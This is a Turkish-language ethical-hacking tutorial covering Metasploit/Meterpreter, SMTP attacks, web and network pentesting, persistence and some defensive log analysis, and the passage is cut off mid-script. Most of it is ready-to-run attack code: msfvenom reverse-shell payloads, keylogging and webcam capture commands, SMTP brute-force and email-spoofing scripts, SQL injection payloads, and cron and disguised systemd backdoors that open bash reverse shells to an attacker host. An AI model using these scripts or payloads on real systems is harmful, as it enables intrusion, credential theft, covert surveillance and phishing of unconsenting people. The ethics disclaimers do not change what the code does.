# 🛡️ Güvenlik Testleri ve Saldırı Simülasyonları Rehberi

## 📚 Bu Bölümde Neler Öğreneceğiz?

- Meterpreter kullanımı ve session yönetimi
- SMTP servis analizi ve testleri
- Manuel penetrasyon testleri
- Güvenlik açığı tespiti
- Etik hacking teknikleri

---

## 🎯 METERPRETER - Güçlü Post-Exploitation Aracı

### Meterpreter Nedir?
Meterpreter, bir hedef sisteme erişim sağladıktan sonra kullanılan gelişmiş bir shell'dir. Bir casusluk filmi gibi düşünün - sisteme sızdıktan sonra iz bırakmadan bilgi toplamak, dosya çalmak ve sistemi kontrol etmek için kullanılır.

### 🚀 Meterpreter Kurulumu ve Hazırlık

#### Metasploit Framework Kurulumu
```bash
# Kali Linux'ta (zaten kurulu)
msfconsole

# Ubuntu'da kurulum
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

#### Meterpreter Payload Oluşturma
```bash
# Windows executable oluşturma
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Linux binary oluşturma
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell

# PHP web shell oluşturma
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# Android APK oluşturma
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o hack.apk
```

### 🎮 Meterpreter Handler Kurulumu

#### Temel Handler
```bash
# Metasploit console'u başlat
msfconsole

# Handler modülünü kullan
use exploit/multi/handler

# Payload ayarla
set payload windows/meterpreter/reverse_tcp

# Kendi IP'nizi ayarlayın
set LHOST 192.168.1.100
set LPORT 4444

# Handler'ı başlat
exploit -j
```

#### Otomatik Handler Script'i
```bash
#!/bin/bash
# auto_handler.sh

echo "🎯 Meterpreter Handler Başlatıcı"
read -p "Dinlenecek IP (LHOST): " lhost
read -p "Dinlenecek Port (LPORT): " lport
read -p "Payload türü (1:Windows, 2:Linux, 3:Android): " payload_type

case $payload_type in
    1) payload="windows/meterpreter/reverse_tcp" ;;
    2) payload="linux/x86/meterpreter/reverse_tcp" ;;
    3) payload="android/meterpreter/reverse_tcp" ;;
    *) payload="windows/meterpreter/reverse_tcp" ;;
esac

echo "🚀 Handler başlatılıyor..."

msfconsole -x "
use exploit/multi/handler;
set payload $payload;
set LHOST $lhost;
set LPORT $lport;
set ExitOnSession false;
exploit -j -z
"
```

---

## 🕵️ Meterpreter Komutları ve Session Yönetimi

### 📋 Temel Meterpreter Komutları

#### Sistem Bilgi Toplama
```bash
# Meterpreter session'ına bağlandıktan sonra:

# Sistem bilgilerini göster
sysinfo

# Kullanıcı bilgilerini göster
getuid

# Çalışan işlemleri listele
ps

# Ağ bağlantılarını göster
netstat

# Dosya sistemi bilgileri
df

# Çevresel değişkenleri göster
getenv
```

#### Dosya İşlemleri
```bash
# Mevcut dizini göster
pwd

# Dizin değiştir
cd /path/to/directory

# Dosya listele
ls
dir  # Windows için

# Dosya indir
download "C:\\Users\\user\\Desktop\\important.txt" ./

# Dosya yükle
upload "/home/hacker/tool.exe" "C:\\temp\\"

# Dosya ara
search -f *.txt -d C:\\Users\\

# Dosya içeriğini göster
cat filename.txt
```

#### Ekran Görüntüsü ve Kayıt
```bash
# Ekran görüntüsü al
screenshot

# Webcam'den fotoğraf çek
webcam_snap

# Ekran kaydı başlat
record_mic

# Tuş kaydedicisi başlat
keyscan_start

# Tuş kayıtlarını göster
keyscan_dump

# Tuş kaydedicisini durdur
keyscan_stop
```

### 🎭 Privilege Escalation

#### Windows'ta Yetki Yükseltme
```bash
# Otomatik yetki yükseltme
getsystem

# UAC bypass dene
bypassuac

# Alternatif yetki yükseltme
use priv
priv
```

#### Linux'ta Yetki Yükseltme
```bash
# Sudo bilgileri kontrol et
shell
sudo -l

# SUID dosyalarını bul
find / -perm -4000 2>/dev/null

# Çekirdek sürümünü kontrol et
uname -a
```

### 🌐 Ağ Pivot İşlemleri

#### Ağ Keşfi
```bash
# Ağdaki diğer makineleri bul
run arp_scanner -r 192.168.1.0/24

# Port taraması yap
portfwd -h

# Route ekleme
route add 192.168.10.0 255.255.255.0 1
```

#### Pivot Kurma
```bash
# Autoroute ekleme
run autoroute -s 192.168.10.0/24

# Socks proxy başlatma
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 1080
run -j

# Proxychains ile kullanım
proxychains nmap -sT 192.168.10.1
```

---

## 📧 SMTP Servis Analizi ve Testleri

### SMTP Nedir?
SMTP (Simple Mail Transfer Protocol), e-posta gönderimi için kullanılan protokoldür. Postane gibi çalışır - mektupları (e-postaları) hedefe ulaştırır.

### 🔍 SMTP Keşfi ve Tarama

#### SMTP Servis Tespiti
```bash
# SMTP portlarını tara
nmap -p 25,465,587 -sV target.com

# SMTP banner bilgisi
telnet target.com 25

# SMTP komutlarını test et
nmap --script smtp-commands target.com

# SMTP açık relay kontrolü
nmap --script smtp-open-relay target.com
```

#### Manuel SMTP Testleri
```bash
# SMTP sunucusuna bağlan
telnet mail.target.com 25

# Temel SMTP komutları:
HELO hacker.com
MAIL FROM: <test@hacker.com>
RCPT TO: <victim@target.com>
DATA
Subject: Test

Bu bir test mesajıdır.
.
QUIT
```

### 🎯 SMTP Güvenlik Testleri

#### SMTP Kullanıcı Numaralandırma
```bash
#!/bin/bash
# smtp_user_enum.sh

echo "📧 SMTP Kullanıcı Numaralandırma"
read -p "SMTP Server: " smtp_server
read -p "Kullanıcı listesi dosyası: " user_list

echo "🔍 $smtp_server üzerinde kullanıcılar aranıyor..."

while read username; do
    echo "VRFY $username" | nc $smtp_server 25 | grep -v "Connection"
    echo "EXPN $username" | nc $smtp_server 25 | grep -v "Connection"
done < $user_list
```

#### SMTP Brute Force
```bash
#!/bin/bash
# smtp_brute.sh

echo "🔨 SMTP Brute Force Saldırısı"
read -p "SMTP Server: " server
read -p "Port (25): " port
port=${port:-25}
read -p "Kullanıcı adı: " username
read -p "Şifre listesi: " passlist

echo "🎯 $server:$port - $username hesabı deneniyor..."

while read password; do
    echo "👤 Denenen şifre: $password"
    
    result=$(python3 -c "
import smtplib
try:
    server = smtplib.SMTP('$server', $port)
    server.starttls()
    server.login('$username', '$password')
    print('SUCCESS: $password')
    server.quit()
except:
    print('FAILED: $password')
")
    
    if echo "$result" | grep -q "SUCCESS"; then
        echo "✅ Şifre bulundu: $password"
        break
    fi
    
    sleep 1
done < $passlist
```

### 📬 SMTP Spoofing ve Phishing

#### E-posta Spoofing Script'i
```bash
#!/bin/bash
# smtp_spoof.sh

echo "⚠️  DİKKAT: Bu araç sadece eğitim amaçlıdır!"
echo "📧 SMTP E-posta Spoofing Aracı"

read -p "SMTP Server: " smtp_server
read -p "SMTP Port (25): " smtp_port
smtp_port=${smtp_port:-25}
read -p "Gönderen (sahte): " fake_sender
read -p "Alıcı: " recipient
read -p "Konu: " subject
read -p "Mesaj dosyası: " message_file

echo "📤 E-posta gönderiliyor..."

python3 << EOF
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# E-posta oluştur
msg = MIMEMultipart()
msg['From'] = "$fake_sender"
msg['To'] = "$recipient"
msg['Subject'] = "$subject"

# Mesaj içeriğini oku
with open("$message_file", "r") as f:
    body = f.read()

msg.attach(MIMEText(body, 'plain'))

# SMTP bağlantısı ve gönderim
try:
    server = smtplib.SMTP('$smtp_server', $smtp_port)
    text = msg.as_string()
    server.sendmail("$fake_sender", "$recipient", text)
    server.quit()
    print("✅ E-posta başarıyla gönderildi!")
except Exception as e:
    print(f"❌ Hata: {e}")
EOF
```

---

## 🔧 Manuel Penetrasyon Testleri

### 🎯 Web Uygulaması Testleri

#### Directory Busting
```bash
#!/bin/bash
# dir_buster.sh

echo "📁 Directory Busting Aracı"
read -p "Hedef URL: " target_url
read -p "Wordlist dosyası (/usr/share/wordlists/dirb/common.txt): " wordlist
wordlist=${wordlist:-/usr/share/wordlists/dirb/common.txt}

echo "🔍 $target_url üzerinde dizin taraması..."

while read directory; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$target_url/$directory/")
    
    if [ "$response" = "200" ]; then
        echo "✅ Bulundu: $target_url/$directory/ ($response)"
    elif [ "$response" = "301" ] || [ "$response" = "302" ]; then
        echo "🔀 Yönlendirme: $target_url/$directory/ ($response)"
    elif [ "$response" = "403" ]; then
        echo "🚫 Yasaklı: $target_url/$directory/ ($response)"
    fi
    
    # Rate limiting için bekleme
    sleep 0.1
done < $wordlist
```

#### SQL Injection Tester
```bash
#!/bin/bash
# sqli_tester.sh

echo "💉 SQL Injection Test Aracı"
read -p "Hedef URL (parametreli): " target_url

# SQL injection payloads
payloads=(
    "'"
    "1' OR '1'='1"
    "1' OR '1'='1' --"
    "1' OR '1'='1' #"
    "1' UNION SELECT NULL--"
    "1' AND 1=1--"
    "1' AND 1=2--"
    "admin'--"
    "admin'#"
)

echo "🔍 SQL Injection testleri başlıyor..."

for payload in "${payloads[@]}"; do
    echo "🧪 Test edilen payload: $payload"
    
    # URL'deki PARAM yerine payload'ı koy
    test_url="${target_url/PARAM/$payload}"
    
    response=$(curl -s "$test_url")
    
    # SQL hata mesajlarını ara
    if echo "$response" | grep -qi -E "(mysql|sql|oracle|postgresql|sqlite).*error|syntax.*error|warning.*mysql"; then
        echo "🚨 OLASI SQL INJECTION BULUNDU!"
        echo "Payload: $payload"
        echo "URL: $test_url"
        echo "---"
    fi
    
    sleep 0.5
done
```

### 🌐 Ağ Penetrasyon Testleri

#### Comprehensive Network Scanner
```bash
#!/bin/bash
# comprehensive_scan.sh

echo "🌐 Kapsamlı Ağ Güvenlik Taraması"
read -p "Hedef ağ/IP: " target

# Çıktı klasörü oluştur
output_dir="scan_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p $output_dir

echo "📊 Tarama sonuçları: $output_dir"

# 1. Host Discovery
echo "🔍 1. Host keşfi..."
nmap -sn $target > $output_dir/host_discovery.txt
echo "✅ Host keşfi tamamlandı"

# 2. Port Scanning
echo "🔍 2. Port taraması..."
nmap -sS -O -sV $target > $output_dir/port_scan.txt
echo "✅ Port taraması tamamlandı"

# 3. Service Enumeration
echo "🔍 3. Servis numaralandırma..."
nmap -sC $target > $output_dir/service_enum.txt
echo "✅ Servis numaralandırma tamamlandı"

# 4. Vulnerability Scanning
echo "🔍 4. Güvenlik açığı taraması..."
nmap --script vuln $target > $output_dir/vuln_scan.txt
echo "✅ Güvenlik açığı taraması tamamlandı"

# 5. SMB Enumeration
echo "🔍 5. SMB numaralandırma..."
nmap --script smb-enum-* $target > $output_dir/smb_enum.txt
echo "✅ SMB numaralandırma tamamlandı"

# 6. Web Service Testing
echo "🔍 6. Web servisi testleri..."
nmap --script http-enum,http-headers,http-methods $target > $output_dir/web_tests.txt
echo "✅ Web servisi testleri tamamlandı"

# Özet rapor oluştur
echo "📋 Özet rapor oluşturuluyor..."
cat > $output_dir/summary.txt << EOF
KAPSAMLI AĞ GÜVENLİK TARAMI RAPORU
==================================
Tarih: $(date)
Hedef: $target

1. Host Keşfi Sonuçları:
$(grep "Nmap scan report" $output_dir/host_discovery.txt | wc -l) aktif host bulundu

2. Açık Portlar:
$(grep "/tcp open" $output_dir/port_scan.txt)

3. Kritik Güvenlik Açıkları:
$(grep -i "VULNERABLE" $output_dir/vuln_scan.txt)

4. SMB Paylaşımları:
$(grep -A 5 "smb-enum-shares" $output_dir/smb_enum.txt)

Detaylar için ilgili dosyaları inceleyin.
EOF

echo "✅ Tarama tamamlandı! Sonuçlar: $output_dir"
```

#### Automated Exploitation Framework
```bash
#!/bin/bash
# auto_exploit.sh

echo "🎯 Otomatik Saldırı Çerçevesi"
echo "⚠️  Sadece yetkili testlerde kullanın!"

read -p "Hedef IP: " target_ip
read -p "Hedef Port: " target_port

# Servis tespiti
echo "🔍 Servis tespiti yapılıyor..."
service_info=$(nmap -sV -p $target_port $target_ip | grep "$target_port/tcp")
echo "Servis: $service_info"

# Güvenlik açığı tarama
echo "🔍 Güvenlik açıkları aranıyor..."
nmap --script vuln -p $target_port $target_ip > vuln_results.txt

# Metasploit modül önerisi
if grep -qi "ssh" <<< "$service_info"; then
    echo "🎯 SSH servisi tespit edildi!"
    echo "Önerilen saldırılar:"
    echo "- SSH Brute Force: auxiliary/scanner/ssh/ssh_login"
    echo "- SSH User Enumeration: auxiliary/scanner/ssh/ssh_enumusers"
    
elif grep -qi "http" <<< "$service_info"; then
    echo "🎯 HTTP servisi tespit edildi!"
    echo "Önerilen saldırılar:"
    echo "- Directory Scanner: auxiliary/scanner/http/dir_scanner"
    echo "- HTTP Options: auxiliary/scanner/http/options"
    
elif grep -qi "smb\|microsoft-ds" <<< "$service_info"; then
    echo "🎯 SMB servisi tespit edildi!"
    echo "Önerilen saldırılar:"
    echo "- SMB Login: auxiliary/scanner/smb/smb_login"
    echo "- EternalBlue: exploit/windows/smb/ms17_010_eternalblue"
    
elif grep -qi "ftp" <<< "$service_info"; then
    echo "🎯 FTP servisi tespit edildi!"
    echo "Önerilen saldırılar:"
    echo "- FTP Login: auxiliary/scanner/ftp/ftp_login"
    echo "- Anonymous FTP: auxiliary/scanner/ftp/anonymous"
fi

# Otomatik Metasploit script'i oluştur
cat > auto_metasploit.rc << EOF
# Otomatik Metasploit Resource Script
# Hedef: $target_ip:$target_port

# SSH Brute Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $target_ip
set RPORT $target_port
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

# HTTP Directory Scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS $target_ip
set RPORT $target_port
run

# SMB Login Brute Force
use auxiliary/scanner/smb/smb_login
set RHOSTS $target_ip
set SMBUser admin
set PASS_FILE /usr/share/wordlists/metasploit/passwords.txt
run
EOF

echo "📜 Metasploit resource script oluşturuldu: auto_metasploit.rc"
echo "Kullanım: msfconsole -r auto_metasploit.rc"
```

---

## 🎮 Session Yönetimi ve Persistence

### 📱 Multi-Session Handler
```bash
#!/bin/bash
# session_manager.sh

echo "🎮 Session Yöneticisi"

# Metasploit resource script oluştur
cat > session_handler.rc << 'EOF'
# Multi-Session Handler

# Windows Meterpreter Handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Linux Meterpreter Handler  
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4445
set ExitOnSession false
exploit -j -z

# Android Meterpreter Handler
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4446
set ExitOnSession false
exploit -j -z

# Web Shell Handler
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4447
set ExitOnSession false
exploit -j -z
EOF

echo "🚀 Multi-session handler başlatılıyor..."
msfconsole -r session_handler.rc
```

### 🔄 Persistence Teknikleri

#### Windows Persistence
```bash
# Meterpreter session'ında:

# Registry persistence
run persistence -S -U -X -i 20 -p 4444 -r 192.168.1.100

# Service persistence
run metsvc

# Scheduled task persistence
run scheduleme -m 60 -p 4444 -h 192.168.1.100

# Startup folder persistence
upload /tmp/backdoor.exe C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start\ Menu\\Programs\\Startup\\
```

#### Linux Persistence
```bash
# Cron job persistence
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" | crontab -

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Service persistence (systemd)
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Monitor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
```

---

## 🛡️ Savunma ve Tespit

### 🔍 Log Analizi Script'i
```bash
#!/bin/bash
# log_analyzer.sh

echo "🔍 Güvenlik Log Analiz Aracı"

# SSH saldırı tespiti
echo "🔐 SSH Saldırı Analizi:"
echo "========================"
grep "Failed password" /var/log/auth.log | tail -20
echo ""
echo "En çok denenen kullanıcı adları:"
grep "Failed password" /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -nr | head -10
echo ""
echo "Saldırgan IP adresleri:"
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -10

echo ""
echo "🌐 Web Saldırı Analizi:"
echo "======================="
# Apache/Nginx log analizi (access.log)
if [ -f /var/log/apache2/access.log ]; then
    echo "Şüpheli HTTP istekleri:"
    grep -E "(SELECT|UNION|INSERT|UPDATE|DELETE|\.\./|<script)" /var/log/apache2/access.log | tail -10
elif [ -f /var/log/nginx/access.log ]; then
    echo "Şüpheli HTTP istekleri:"
    grep -E "(SELECT|UNION|INSERT|UPDATE|DELETE|\.\./|<script)" /var/log/nginx/access.log | tail -10
fi

echo ""
echo "🚨 Sistem Güvenlik Olayları:"
echo "============================"
# Sudo kullanımları
echo "Son sudo kullanımları:"
grep "sudo:" /var/log/auth.log | tail -10

# Başarısız login denemeleri
echo ""
echo "Başarısız login denemeleri:"
grep "authentication failure" /var/log/auth.log | tail -10
```

### 🛡️ Incident Response Script'i
```bash
#!/bin/bash
# incident_response.sh

echo "🚨 Olay Müdahale Aracı"
echo "======================"

# Sistem durumu kontrolü
echo "📊 Sistem Durumu:"
echo "=================="
echo "Yük durumu: $(uptime)"
echo "Disk kullanımı: $(df -h / | tail -1)"
echo "Bellek kullanımı: $(free -h)"
echo ""

# Aktif bağlantılar
echo "🌐 Aktif Ağ Bağlantıları:"
echo "========================="
netstat -tulpn | grep LISTEN
echo ""

# Şüpheli işlemler
echo "⚠️  Şüpheli İşlemler:"
echo "===================="
ps aux --sort=-%cpu | head -10
echo ""

# Son login'ler
echo "👤 Son Giriş Yapan Kullanıcılar:"
echo "================================"
last | head -20
echo ""

# Cron job'ları kontrol et
echo "⏰ Zamanlanmış Görevler:"
echo "======================="
crontab -l 2>/dev/null || echo "Kullanıcı cron job'ı yok"
sudo crontab -l 2>/dev/null || echo "Root cron job'ı yok"

# Autostart programları
echo ""
echo "🚀 Otomatik Başlayan Programlar:"
echo "================================"
ls -la ~/.config/autostart/ 2>/dev/null || echo "Autostart klasörü yok"
systemctl list-unit-files | grep enabled | head -10

# Dosya bütünlüğü kontrolü
echo ""
echo "🔒 Kritik Dosya Kontrolü:"
echo "========================="
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null

# Ağ trafiği analizi
echo ""
echo "📈 Ağ Trafiği Analizi (Son 5 dakika):"
echo "======================================"
if command -v iftop >/dev/null; then
    timeout 10 iftop -t -s 10
else
    echo "iftop kurulu değil. Kurulum: sudo apt install iftop"
fi
```

---

## 🎓 Etik ve Yasal Uyarılar

### ⚠️ ÖNEMLİ ETİK KURALLARI

#### Yasalara Uygunluk
```bash
# Bu script sadece eğitim amaçlıdır
cat > etik_sozlesmesi.txt << 'EOF'
ETİK HACKING SÖZLEŞMESI
======================

Ben, bu araçları kullanarak:

✅ Sadece kendi sistemlerimde test yapacağım
✅ Açık izinli test ortamlarında çalışacağım  
✅ Eğitim laboratorları kuracağım
✅ Yasal penetrasyon testleri yapacağım
✅ Güvenlik açıklarını sorumlu şekilde bildireceğim

❌ Başkalarının sistemlerine izinsiz erişim sağlamayacağım
❌ Zarar verici faaliyetlerde bulunmayacağım
❌ Kişisel veriler çalmayacağım
❌ Sistemlere kalıcı zarar vermeyeceğim
❌ Bu bilgileri kötü amaçla kullanmayacağım

İmza: ________________
Tarih: ________________
EOF

echo "📜 Lütfen etik sözleşmeyi okuyun ve imzalayın!"
cat etik_sozlesmesi.txt
```

#### Güvenli Test Ortamı Kurulumu
```bash
#!/bin/bash
# lab_setup.sh

echo "🏗️  Güvenlik Test Laboratuvarı Kurulumu"
echo "======================================="

echo "📦 Gerekli araçları yüklüyor..."

# VirtualBox kurulumu
if ! command -v virtualbox >/dev/null; then
    echo "VirtualBox yükleniyor..."
    sudo apt update
    sudo apt install -y virtualbox virtualbox-ext-pack
fi

# Vagrant kurulumu (Kolay VM yönetimi için)
if ! command -v vagrant >/dev/null; then
    echo "Vagrant yükleniyor..."
    wget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg
    echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
    sudo apt update && sudo apt install -y vagrant
fi

# Zaafiyetli VM'ler indirme bağlantıları
cat > vulnerable_vms.txt << 'EOF'
GÜVENLİK TEST ORTAMLARI
======================

1. Metasploitable 2
   - İndirme: https://sourceforge.net/projects/metasploitable/
   - Kullanım: Temel penetrasyon testleri

2. DVWA (Damn Vulnerable Web Application)  
   - İndirme: http://www.dvwa.co.uk/
   - Kullanım: Web uygulaması güvenliği

3. WebGoat
   - İndirme: https://owasp.org/www-project-webgoat/
   - Kullanım: OWASP Top 10 öğrenme

4. VulnHub VM'leri
   - Site: https://www.vulnhub.com/
   - Kullanım: Çeşitli zorluk seviyelerinde CTF

5. HackTheBox (Online)
   - Site: https://www.hackthebox.eu/
   - Kullanım: Online penetrasyon test platformu

Bu ortamları sadece öğrenme amaçlı kullanın!
EOF

echo "✅ Kurulum tamamlandı!"
echo "📖 Güvenli test ortamları için 'vulnerable_vms.txt' dosyasını inceleyin"
```

---

## 🏆 Kapsamlı Pratik Projeler

### Proje 1: Kendi CTF Challenge'ı Oluşturma
```bash
#!/bin/bash
# create_ctf.sh

echo "🏁 CTF Challenge Oluşturucu"
echo "==========================="

read -p "Challenge adı: " challenge_name
read -p "Zorluk seviyesi (1-5): " difficulty

mkdir -p "ctf_$challenge_name"
cd "ctf_$challenge_name"

# Web tabanlı challenge
cat > index.php << 'EOF'
<?php
// Basit SQL Injection Challenge
$flag = "CTF{5ql_1nj3c710n_m4573r}";

if (isset($_GET['id'])) {
    $id = $_GET['id'];
    
    // Kasıtlı güvenlik açığı - Eğitim amaçlı!
    $query = "SELECT * FROM users WHERE id = '$id'";
    
    if (strpos($id, "UNION") !== false && strpos($id, "flag") !== false) {
        echo "Tebrikler! Flag: " . $flag;
    } else {
        echo "Kullanıcı bulunamadı. İpucu: SQL UNION kullanmayı deneyin!";
    }
} else {
    echo "Kullanım: ?id=1";
}
?>
EOF

# Challenge açıklaması
cat > README.md << EOF
# $challenge_name Challenge

**Zorluk:** $difficulty/5

## Açıklama
Bu challenge SQL Injection konusunu öğretmek için tasarlanmıştır.

## Hedef
Web uygulamasındaki SQL injection açığını kullanarak flag'i bulun.

## İpuçları
1. URL parametresi ile oynayın
2. SQL UNION komutunu araştırın
3. flag kelimesini sorgularınızda kullanın

## Çözüm Adımları
1. Normal sorguyu test edin: ?id=1
2. SQL injection deneyin: ?id=1' UNION SELECT flag FROM flags--

## Öğrenme Hedefleri
- SQL Injection nasıl çalışır
- UNION komutunun kullanımı  
- Web uygulaması güvenlik testleri
EOF

echo "✅ CTF Challenge oluşturuldu: ctf_$challenge_name/"
echo "🚀 Test etmek için: php -S localhost:8000"
```

### Proje 2: Otomatik Güvenlik Tarama Sistemi
```bash
#!/bin/bash
# security_audit_system.sh

echo "🛡️ Otomatik Güvenlik Denetim Sistemi"
echo "===================================="

# Konfigürasyon
REPORT_DIR="security_audit_$(date +%Y%m%d_%H%M%S)"
mkdir -p $REPORT_DIR

# Ana menü
show_audit_menu() {
    echo ""
    echo "🔍 Güvenlik Denetim Menüsü:"
    echo "1. Sistem güvenlik taraması"
    echo "2. Ağ güvenlik taraması"
    echo "3. Web uygulaması taraması"
    echo "4. Kablosuz ağ taraması"
    echo "5. Sosyal mühendislik testi"
    echo "6. Tam denetim raporu oluştur"
    echo "7. Çıkış"
}

# Sistem güvenlik taraması
system_security_audit() {
    echo "💻 Sistem Güvenlik Taraması Başlıyor..."
    
    # Kullanıcı hesapları analizi
    echo "👥 Kullanıcı Hesapları:" > $REPORT_DIR/system_audit.txt
    echo "======================" >> $REPORT_DIR/system_audit.txt
    cat /etc/passwd | grep -v "nologin\|false" >> $REPORT_DIR/system_audit.txt
    echo "" >> $REPORT_DIR/system_audit.txt
    
    # Sudo yetkisi olan kullanıcılar
    echo "🔑 Sudo Yetkili Kullanıcılar:" >> $REPORT_DIR/system_audit.txt
    echo "============================" >> $REPORT_DIR/system_audit.txt
    grep -Po '^sudo.+:\K.* /etc/group >> $REPORT_DIR/system_audit.txt
    echo "" >> $REPORT_DIR/system_audit.txt
    
    # Açık portlar
    echo "🔌 Açık Portlar:" >> $REPORT_DIR/system_audit.txt
    echo "===============" >> $REPORT_DIR/system_audit.txt
    netstat -tulpn | grep LISTEN >> $REPORT_DIR/system_audit.txt
    echo "" >> $REPORT_DIR/system_audit.txt
    
    # Çalışan servisler
    echo "⚙️  Çalışan Servisler:" >> $REPORT_DIR/system_audit.txt
    echo "=====================" >> $REPORT_DIR/system_audit.txt
    systemctl list-units --type=service --state=active >> $REPORT_DIR/system_audit.txt
    
    # SUID/SGID dosyalar
    echo "🔒 SUID/SGID Dosyaları:" >> $REPORT_DIR/system_audit.txt
    echo "======================" >> $REPORT_DIR/system_audit.txt
    find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null >> $REPORT_DIR/system_audit.txt
    
    echo "✅ Sistem taraması tamamlandı: $REPORT_DIR/system_audit.txt"
}

# Ağ güvenlik taraması
network_security_audit() {
    echo "🌐 Ağ Güvenlik Taraması Başlıyor..."
    
    read -p "Hedef ağ (örn: 192.168.1.0/24): " target_network
    
    echo "🔍 Ağ Taraması: $target_network" > $REPORT_DIR/network_audit.txt
    echo "===============================" >> $REPORT_DIR/network_audit.txt
    
    # Host keşfi
    echo "📍 Aktif Hostlar:" >> $REPORT_DIR/network_audit.txt
    nmap -sn $target_network >> $REPORT_DIR/network_audit.txt
    
    # Port taraması
    echo "" >> $REPORT_DIR/network_audit.txt
    echo "🔌 Port Taraması:" >> $REPORT_DIR/network_audit.txt
    nmap -sS -O $target_network >> $REPORT_DIR/network_audit.txt
    
    # Güvenlik açığı taraması
    echo "" >> $REPORT_DIR/network_audit.txt
    echo "🚨 Güvenlik Açıkları:" >> $REPORT_DIR/network_audit.txt
    nmap --script vuln $target_network >> $REPORT_DIR/network_audit.txt
    
    echo "✅ Ağ taraması tamamlandı: $REPORT_DIR/network_audit.txt"
}

# Web uygulaması taraması
web_application_audit() {
    echo "🌐 Web Uygulaması Güvenlik Taraması"
    
    read -p "Hedef web sitesi (örn: http://example.com): " target_url
    
    echo "🔍 Web Uygulama Taraması: $target_url" > $REPORT_DIR/web_audit.txt
    echo "=================================" >> $REPORT_DIR/web_audit.txt
    
    # HTTP başlık analizi
    echo "📋 HTTP Başlıkları:" >> $REPORT_DIR/web_audit.txt
    curl -I $target_url >> $REPORT_DIR/web_audit.txt 2>/dev/null
    
    # Dizin taraması
    echo "" >> $REPORT_DIR/web_audit.txt
    echo "📁 Dizin Taraması:" >> $REPORT_DIR/web_audit.txt
    
    common_dirs=("admin" "login" "config" "backup" "test" "dev" "api" "phpmyadmin")
    for dir in "${common_dirs[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$target_url/$dir/")
        if [ "$response" = "200" ] || [ "$response" = "301" ] || [ "$response" = "302" ]; then
            echo "✅ $target_url/$dir/ - HTTP $response" >> $REPORT_DIR/web_audit.txt
        fi
    done
    
    # SSL/TLS kontrolü
    echo "" >> $REPORT_DIR/web_audit.txt
    echo "🔒 SSL/TLS Kontrolü:" >> $REPORT_DIR/web_audit.txt
    if command -v sslscan >/dev/null; then
        sslscan $target_url >> $REPORT_DIR/web_audit.txt
    else
        echo "sslscan kurulu değil. Kurulum: sudo apt install sslscan" >> $REPORT_DIR/web_audit.txt
    fi
    
    echo "✅ Web taraması tamamlandı: $REPORT_DIR/web_audit.txt"
}

# Sosyal mühendislik testi
social_engineering_test() {
    echo "🎭 Sosyal Mühendislik Hazırlık Aracı"
    
    read -p "Hedef organizasyon: " organization
    read -p "Hedef domain: " domain
    
    echo "🎯 Sosyal Mühendislik İstihbaratı: $organization" > $REPORT_DIR/social_engineering.txt
    echo "=============================================" >> $REPORT_DIR/social_engineering.txt
    
    # WHOIS bilgileri
    echo "📋 Domain Bilgileri:" >> $REPORT_DIR/social_engineering.txt
    whois $domain >> $REPORT_DIR/social_engineering.txt 2>/dev/null
    
    # E-posta formatları tahmin et
    echo "" >> $REPORT_DIR/social_engineering.txt
    echo "📧 Olası E-posta Formatları:" >> $REPORT_DIR/social_engineering.txt
    echo "- ad.soyad@$domain" >> $REPORT_DIR/social_engineering.txt
    echo "- a.soyad@$domain" >> $REPORT_DIR/social_engineering.txt
    echo "- adsoyad@$domain" >> $REPORT_DIR/social_engineering.txt
    echo "- ad@$domain" >> $REPORT_DIR/social_engineering.txt
    
    # Sosyal medya araştırma önerileri
    echo "" >> $REPORT_DIR/social_engineering.txt
    echo "🔍 Sosyal Medya Araştırma Önerileri:" >> $REPORT_DIR/social_engineering.txt
    echo "- LinkedIn: site:linkedin.com \"$organization\"" >> $REPORT_DIR/social_engineering.txt
    echo "- Twitter: site:twitter.com \"$organization\"" >> $REPORT_DIR/social_engineering.txt
